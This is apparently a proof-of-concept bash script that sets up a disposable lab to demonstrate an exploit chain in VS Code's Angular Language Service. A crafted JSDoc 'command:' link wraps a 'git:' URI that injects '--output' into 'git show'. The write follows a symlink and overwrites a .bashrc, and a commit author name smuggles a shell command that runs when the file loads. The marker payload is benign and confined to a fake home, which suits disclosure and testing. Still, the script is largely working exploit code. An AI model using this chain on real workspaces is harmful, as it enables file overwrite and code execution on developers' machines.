#!/usr/bin/env bash
set -euo pipefail

MODE="${1:-prepare}"
ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
LAB="$ROOT/.lab"
REPO="$LAB/repo"
FAKE_HOME="$LAB/home"
TARGET="$FAKE_HOME/.bashrc"
MARKER="$LAB/code-exec-marker.txt"
STATE="$LAB/state.env"
VERIFY_LOG="$LAB/verify.log"

info() { printf '[*] %s\n' "$*"; }
ok() { printf '[OK] %s\n' "$*"; }
warn() { printf '[WARN] %s\n' "$*" >&2; }
fail() { printf '[FAIL] %s\n' "$*" >&2; exit 1; }
need() { command -v "$1" >/dev/null 2>&1 || fail "missing command: $1"; }

assert_safe_lab() {
  [[ -n "$ROOT" && "$ROOT" != "/" ]] || fail 'unsafe repository root'
  [[ "$LAB" == "$ROOT/.lab" ]] || fail "unexpected lab path: $LAB"
}

remove_lab() {
  assert_safe_lab
  rm -rf -- "$LAB"
}

reset_target() {
  mkdir -p -- "$FAKE_HOME"
  printf '# disposable lab bashrc: safe before overwrite\n' > "$TARGET"
  rm -f -- "$MARKER" "$VERIFY_LOG"
}

encode_payloads() {
  node - "$REPO/p" <<'NODE'
const path = process.argv[2];
const ref = '--output=out';
const gitUri = `git:${path}?${encodeURIComponent(JSON.stringify({path, ref}))}`;
const commandUri = `command:angular.openJsDocLink?${encodeURIComponent(JSON.stringify({file: gitUri}))}`;
console.log(gitUri);
console.log(commandUri);
NODE
}

direct_write() {
  (
    cd -- "$REPO"
    git show --textconv '--output=out:p'
  )
  grep -Fq "$(git -C "$REPO" rev-parse HEAD)" "$TARGET" || \
    fail 'Git returned success but target does not contain HEAD'
  ok 'POSIX symlink overwrite primitive confirmed'
}

test_loaded_target() {
  rm -f -- "$MARKER" "$VERIFY_LOG"
  set +e
  bash --noprofile --rcfile "$TARGET" -i -c 'exit 0' > "$VERIFY_LOG" 2>&1
  local exact_status=$?
  set -e
  [[ -f "$MARKER" ]] || fail "exact rcfile did not create marker; see $VERIFY_LOG"
  ok 'exact overwritten rcfile created benign marker'

  rm -f -- "$MARKER"
  set +e
  HOME="$FAKE_HOME" bash --noprofile -i -c 'exit 0' >> "$VERIFY_LOG" 2>&1
  local home_status=$?
  set -e
  [[ -f "$MARKER" ]] || fail "disposable HOME loading did not create marker; see $VERIFY_LOG"
  ok 'normal disposable HOME loading created benign marker'
  printf '[*] bash statuses: exact=%s home=%s\n' "$exact_status" "$home_status"
}

prepare() {
  need git
  need node
  need npm
  [[ "$(uname -s)" == 'Linux' ]] || fail 'run inside Linux/WSL'

  remove_lab
  mkdir -p -- "$REPO/src" "$FAKE_HOME"
  reset_target

  cat > "$REPO/package.json" <<'JSON'
{
  "name": "angular-jsdoc-uri-local-poc",
  "version": "0.0.0",
  "private": true,
  "dependencies": {
    "@angular/core": "22.0.0-rc.0"
  }
}
JSON

  cat > "$REPO/tsconfig.json" <<'JSON'
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "Bundler",
    "experimentalDecorators": true,
    "strict": true,
    "skipLibCheck": true
  },
  "angularCompilerOptions": {
    "strictTemplates": true
  },
  "files": ["src/poc.ts"]
}
JSON

  printf 'node_modules/\n' > "$REPO/.gitignore"
  printf 'tracked path used to select this repository\n' > "$REPO/p"
  ln -s ../home/.bashrc "$REPO/out:p"

  info 'installing pinned Angular dependency graph with lifecycle scripts disabled'
  (
    cd -- "$REPO"
    npm install --ignore-scripts --no-audit --no-fund
  )

  mapfile -t payloads < <(encode_payloads)
  local git_uri="${payloads[0]}"
  local command_uri="${payloads[1]}"

  cat > "$REPO/src/poc.ts" <<EOF_TS
import {Component} from '@angular/core';

@Component({
  selector: 'poc-root',
  template: '{{ value }}',
})
export class PocComponent {
  /**
   * [Open component documentation]($command_uri)
   */
  value = 'hover me';
}
EOF_TS

  (
    cd -- "$REPO"
    git init -q
    git config log.decorate false
    git config color.ui false
    git add package.json package-lock.json tsconfig.json .gitignore src/poc.ts p 'out:p'
    git -c user.name='PoC' -c user.email='poc@example.invalid' \
      commit -q -m 'minimal Angular hover fixture'
    git -c "user.name=x; touch $MARKER; #" -c user.email='poc@example.invalid' \
      commit -q --allow-empty -m '# Angular Language Service local PoC'
  )

  local commit
  commit="$(git -C "$REPO" rev-parse HEAD)"
  {
    printf 'REPO=%q\n' "$REPO"
    printf 'FAKE_HOME=%q\n' "$FAKE_HOME"
    printf 'TARGET=%q\n' "$TARGET"
    printf 'MARKER=%q\n' "$MARKER"
    printf 'COMMIT=%q\n' "$commit"
    printf 'GIT_URI=%q\n' "$git_uri"
  } > "$STATE"

  info "preflight: git show --textconv '--output=out:p'"
  direct_write
  test_loaded_target
  reset_target
  ok 'target reset; next overwrite must come from VS Code action'

  printf '\nRepository: %s\nTarget:     %s\nMarker:     %s\n' "$REPO" "$TARGET" "$MARKER"
  printf '\nNext: ./poc-wsl.sh open\n'
}

open_workspace() {
  [[ -f "$STATE" ]] || fail 'run prepare first'
  need code
  if ! code --list-extensions 2>/dev/null | grep -qi '^angular\.ng-template$'; then
    warn 'Angular.ng-template not visible to WSL VS Code CLI'
  fi
  info 'opening disposable repository in a new VS Code WSL window'
  code -n "$REPO"
  printf '\nHover `value` in `template: {{ value }}`, click the documentation link, then run verify.\n'
}

verify() {
  [[ -f "$STATE" ]] || fail 'run prepare first'
  # shellcheck disable=SC1090
  source "$STATE"

  grep -Fq "$COMMIT" "$TARGET" 2>/dev/null || \
    fail 'no external overwrite observed; perform the hover click first'
  ok 'external disposable file overwritten through Angular -> git: chain'

  test_loaded_target
  printf '[*] target begins with:\n'
  sed -n '1,8p' "$TARGET"
}

direct() {
  [[ -f "$STATE" ]] || fail 'run prepare first'
  # shellcheck disable=SC1090
  source "$STATE"
  reset_target
  direct_write
  test_loaded_target
  sed -n '1,8p' "$TARGET"
  printf '[*] direct primitive only; Angular and VS Code were bypassed\n'
}

inspect() {
  [[ -f "$STATE" ]] || fail 'run prepare first'
  # shellcheck disable=SC1090
  source "$STATE"
  printf 'REPO=%s\nTARGET=%s\nMARKER=%s\nGIT_URI=%s\n' "$REPO" "$TARGET" "$MARKER" "$GIT_URI"
  ls -l -- "$REPO/out:p"
  sed -n '1,12p' "$TARGET" 2>/dev/null || true
}

cleanup() {
  remove_lab
  ok 'removed disposable laboratory'
}

case "$MODE" in
  prepare) prepare ;;
  open) open_workspace ;;
  verify) verify ;;
  direct) direct ;;
  inspect) inspect ;;
  cleanup) cleanup ;;
  *) fail 'usage: ./poc-wsl.sh {prepare|open|verify|direct|inspect|cleanup}' ;;
esac
